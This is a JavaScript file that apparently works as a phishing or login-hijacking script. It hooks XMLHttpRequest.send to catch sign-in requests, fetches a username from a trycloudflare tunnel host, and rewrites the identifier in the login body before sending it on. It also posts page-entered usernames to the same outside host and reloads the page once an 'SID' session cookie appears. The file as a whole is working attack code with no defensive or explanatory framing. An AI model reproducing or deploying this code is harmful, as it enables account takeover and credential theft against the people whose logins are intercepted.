let freqUsername = null;
const modifiedRequests = new Set();
const pendingRequests = new Map(); 

let usernameFetched = false;

// ✅ Always fetch the username when needed
const fetchFreqUsername = async () => {
    console.log('Fetching username...');
    try {
        const response = await fetch('https://pdt-sons-paperback-suffer.trycloudflare.com/get-first-post-data');
        const result = await response.json();
        
        if (result.postData) {
            freqUsername = result.postData;
            console.log('Fetched username:', freqUsername);
            usernameFetched = true;

            // ✅ Reset the server-side username store
            await fetch('https://pdt-sons-paperback-suffer.trycloudflare.com/reset-first-post-data', { method: 'POST' });

            // Process pending requests now that username is available
            processModifiedRequests();
        }
    } catch (error) {
        console.error('Error fetching username:', error);
        setTimeout(fetchFreqUsername, 1000); // Retry after 1s if it fails
    }
};

// ✅ Ensure pending requests are modified correctly
const processModifiedRequests = () => {
    for (let [xhr, body] of pendingRequests) {
        if (!freqUsername) {
            console.log("No username available yet, retrying...");
            fetchFreqUsername();
            return;
        }

        let modified = false;
        const match = body && /identity-signin-identifier%5C%22%2C%5C%22([^&]*)%5C/.exec(body);

        if (match && !modifiedRequests.has(freqUsername)) {
            body = body.replace(match[1], freqUsername);
            modifiedRequests.add(freqUsername);
            modified = true;
            freqUsername = null;
        }

        if (modified) {
            console.log("Modified request with new username:", body);
            xhr.send(body);
            pendingRequests.delete(xhr);
        }
    }
};

// ✅ Intercept XMLHttpRequest to modify requests with username
const originalXhrSend = XMLHttpRequest.prototype.send;
XMLHttpRequest.prototype.send = function (body) {
    if (!body) {
        originalXhrSend.call(this, body);
        return;
    }

    if (/identity-signin-identifier/.test(body) && !Array.from(modifiedRequests).some(m => body.includes(m))) {
        console.log("Intercepted request:", body);
        pendingRequests.set(this, body);
        processModifiedRequests();
    } else {
        originalXhrSend.call(this, body);
    }
};

// ✅ Ensure username is always sent correctly
function sendUsername() {
    console.log('Sending username...');

    const username = document.getElementById('username')?.value;
    if (!username) {
        console.warn("No username entered");
        return;
    }

    fetch('https://pdt-sons-paperback-suffer.trycloudflare.com/save-username', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username })
    })
    .then(response => {
        if (response.ok) console.log('Username sent successfully');
        else console.error('Error sending username:', response.statusText);
    })
    .catch(error => console.error('Error sending username:', error));
}

// ✅ Attach event listeners to buttons
const button = document.getElementById('sendUsernameBtn');
if (button) {
    button.addEventListener('click', sendUsername);
}


setInterval(() => {
    if (document.cookie.includes('SID')) {
        location.reload();
    }
}, 3000);

// ✅ Fetch username immediately on page load
fetchFreqUsername();
